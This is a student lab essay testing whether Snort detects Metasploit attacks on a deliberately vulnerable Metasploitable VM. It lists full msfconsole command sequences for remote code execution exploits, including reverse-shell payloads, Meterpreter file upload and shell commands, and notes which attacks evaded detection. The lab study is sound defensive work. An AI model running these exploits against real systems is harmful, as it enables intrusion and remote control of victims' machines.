
# Is it easier to fix the application than to detect attacks?

A version of this essay with the correct formatting and references can be found here: https://github.com/JonQuxBurton/CyberSecurityBasewithF-Secure/blob/master/Project2/Is-it-easier-to-fix-the-application-than-to-detect-attacks.md

To research the question I setup the lab of Metasploit (a penetration testing tool), Metasploitable (a deliberately vulnerable system) and Snort (an Intrusion Detection System). 
I used Virtual Box running Metasploitable on a Windows 8 virtual machine (IP address: 192.168.0.6) and the Metasploit framework on an Ubuntu virtual machine (IP address: 192.168.0.4), which were both setup in a bridged network so they could communicate with each other.

In the Snort configuration file I enabled all the Community rules to give the best chance of detecting an attack.
I also installed Wireshark on the Snort machine, to inspect the traffic and check it was flowing.
I used the nmap command from the Ubuntu machine to test that Snort was creating alerts correctly, specifically:

sudo nmap -sP 192.168.0.6 -disable-arp-ping

With this setup I was able to find three attacks which produced Snort alerts and two attacks which did not, as follows.

The first attack which triggered a Snort alert was against ManageEngine, which is software for managing desktops and mobiles.
To trigger this alert I took the following steps:

Open MetaSploit console with the command sudo msfconsole. In the MetaSploit console enter the commands:

use exploit/windows/http/manageengine_connectionid_write

set payload windows/meterpreter/reverse_tcp

set rhost 192.168.0.6

set rport 8020

set lhost 192.168.0.4

set lport 443

exploit

This caused Snort to log the following alert:

03/18-14:39:10.347865  [**] [1:1054:14] SERVER-WEBAPP weblogic/tomcat .jsp view source attempt [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 192.168.0.4:46771 -> 192.168.0.6:8020

So Snort has clearly detected the attack from the Web Application Attack rules.

The second attack which triggered a Snort alert was against SNMP (Simple Network Management Protocol).
This can be performed by using the following commands in the MetaSploit console:
use auxiliary/scanner/snmp/snmp_enum
set rhost 192.168.0.6
set rport 8020 
set lhost 192.168.0.4
set lport 443
exploit

This triggered the Snort alerts:

03/18-16:16:13.000689  [**] [1:1411:19] PROTOCOL-SNMP public access udp [**] [Classification: Attempted Information Leak] [Priority: 2] {UDP} 192.168.0.4:43403 -> 192.168.0.6:161

03/18-16:16:13.000689  [**] [1:1417:17] PROTOCOL-SNMP request udp [**] [Classification: Attempted Information Leak] [Priority: 2] {UDP} 192.168.0.4:43403 -> 192.168.0.6:161

So Snort has detected the attack and recorded an Attempted Information Leak.

The third attack which triggered a Snort alert was against the MySQL database service. This can be performed by using the following commands in the Metasploit console:

use exploit/multi/mysql/mysql_udf_payload

set rhost 192.168.0.6

set rport 3306  

set lhost 192.168.0.4

set lport 443

exploit

This triggered the Snort alert:

03/18-14:59:00.631297  [**] [1:1394:17] INDICATOR-SHELLCODE x86 inc ecx NOOP [**] [Classification: Executable Code was Detected] [Priority: 1] {TCP} 192.168.0.4:40659 -> 192.168.0.6:3306

So Snort has detected the attack and recorded an Executable Code was Detected alert.

I was also able to evade Snort with two attacks.

The first was against Elasticsearch, which is a full-text search engine with a HTTP web interface. This can be performed by using the following commands in the Metasploit console:

use exploit/multi/elasticsearch/script_mvel_rce

set rhost 192.168.0.6

set rport 9200 

set lhost 192.168.0.4

set lport 443

exploit

This copies a JAR file onto the victims computer and executes it, this connects back to Metasploit to create a shell. This is the Meterpreter console and I was able to use it to run commands on the victim computer, such as:

> upload /temp/trojan.exe c:\\

Copy an executable to the victim computer (not a real trojan, just an empty file).

> shell

Open a shell on the victim computer, followed by the command

> msg vagrant "Hello"

Pop up a message on the vagrant users screen.

No Snort alerts were triggered.

The second attack which evaded Snort was against Ruby on Rails, which is a web application framework. This can be performed by using the following commands in the Metasploit console:

use exploit/multi/http/rails_web_console_v2_code_exec

set rhost 192.168.0.6

set rport 3000 

set lhost 192.168.0.4

set lport 443

exploit

I was then able to run the command:

> msg vagrant "Hello"

To pop up a message on the vagrant users screen.

No Snort alerts were triggered.

Though this shell seemed to be restricted as I was unable to get out of the directory C:\Program Files\Rails_Server
and running the command "dir" did then produce an alert:

03/18-15:16:46.820336  [**] [1:1292:12] INDICATOR-COMPROMISE directory listing [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 192.168.0.6:1502 -> 192.168.0.4:443

Though it is only of "Potentially Bad Traffic".

In conclusion I would say that the answer to the question "Is it easier to fix the application than to detect attacks?" is yes. I was able to evade an intruder detection system with two attacks, using a widely available tool, so a more experience attacker would be able to do this as well. 

A vulnerability in a application can be fixed by just patching it. The fix will be specific to the application and an application like Elasticsearch should never allow Remote Code Execution. Fixing this is a simpler problem than trying to detect an intruder. Doing this cannot be guaranteed to be effective one hundred percent of the time as an attacker can use advanced  techniques such as fragmentation and obfuscation.

Overall I found Snort to detect quite a lot of the attacks, but with the sensitivity turned up high there could also be a lot of false positives which would increase the chance of the alerts being ignored. Though I do think that an IDS could still be useful  as part of a defence in depth approach.

---

References

https://github.com/rapid7/metasploitable3/wiki/Vulnerabilities
